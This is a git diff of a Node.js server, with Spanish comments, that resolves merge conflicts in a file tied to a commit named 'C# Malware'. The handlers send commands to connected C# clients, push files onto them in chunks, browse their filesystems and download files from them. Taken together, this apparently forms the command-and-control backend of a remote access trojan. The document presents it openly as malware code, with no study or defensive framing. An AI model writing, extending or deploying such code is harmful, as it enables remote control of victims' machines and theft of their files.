@@ -29,40 +29,18 @@ const send_cmd = async (clients, req, res) => {
         }
     }, 5000);
 };
-<<<<<<< HEAD
 const upload_file = async (clients, req, res) => {
-=======
-
-const upload_file = async(clients,req,res) => {
-
->>>>>>> parent of 0562887 (C# Malware)
     try {
-
-        console.log("subida");
-        
         const clientId = req.params.id;
         const client = clients.get(clientId);
+        const destination = req.body.destination;
 
-        const destination=req.body.destination;
-        
-        
         if (!client || client.readyState !== 1) {
             return res.status(404).json({ error: 'Cliente no conectado' });
         }
 
-<<<<<<< HEAD
         const chunkSize = 64 * 1024;
         const buffer = req.file.buffer;
-=======
-
-        
-        // Envía el comando
-        
-        const chunkSize = 64 * 1024; // 64 KB
-        const buffer = req.file.buffer;
-        
-        
->>>>>>> parent of 0562887 (C# Malware)
         let offset = 0;
 
         // Crear una promesa para esperar confirmación
@@ -91,18 +69,13 @@ const upload_file = async(clients,req,res) => {
             client.send(JSON.stringify({
                 destination,
                 chunk: {
-<<<<<<< HEAD
                     data: chunk.toString('base64'),
-=======
-                    data: chunk.toString('base64'), // conviertes a base64
->>>>>>> parent of 0562887 (C# Malware)
                     last: offset + chunkSize >= buffer.length
                 }
             }));
             offset += chunkSize;
         }
 
-<<<<<<< HEAD
         // Esperar a que el cliente C# confirme que terminó
         await uploadConfirmed;
 
@@ -111,15 +84,7 @@ const upload_file = async(clients,req,res) => {
     } catch (error) {
         console.error("Error en subida:", error);
         return res.status(400).json({ ok:false, msg: "Error al subir" });
-=======
-
-        return res.status(200).json({msg:"Subida correcta"})
-        
-    } catch (error) {
-        return res.status(400).json({msg:"Error al subir"})
->>>>>>> parent of 0562887 (C# Malware)
     }
-
 };
 
 
@@ -127,16 +92,17 @@ const upload_file = async(clients,req,res) => {
 
 const getFiles= async(clients, req, res = response) => {
 
-    const path = req.query.path || "/";
-    const clientId = req.params.id;
-    const client = clients.get(clientId);
+    const path = req.body.path || "/";
+    const clientId = req.body.id;
 
+    const client = clients.get(clientId);
 
     if (!client || client.readyState !== 1) {
         return res.status(404).json({ error: 'Cliente no conectado' });
     }
 
     const msgHandler = (msg) => {
+
         try {
             const parsed = JSON.parse(msg);
             res.status(200).json(parsed);
@@ -161,13 +127,14 @@ const getFiles= async(clients, req, res = response) => {
 
 // Descargar archivo
 const downloadFiles=async (clients, req, res = response) => {
-    const path = req.query.path || "/";
-    const clientId = req.params.id;
+    const path = req.body.path || "/";
+    const clientId = req.body.id;
     const client = clients.get(clientId);
+
 
     if (!client || client.readyState !== 1) {
         return res.status(404).json({ error: 'Cliente no conectado' });
-    }
+    } 
 
     let receivedChunks = [];
     let expectedFile = null;
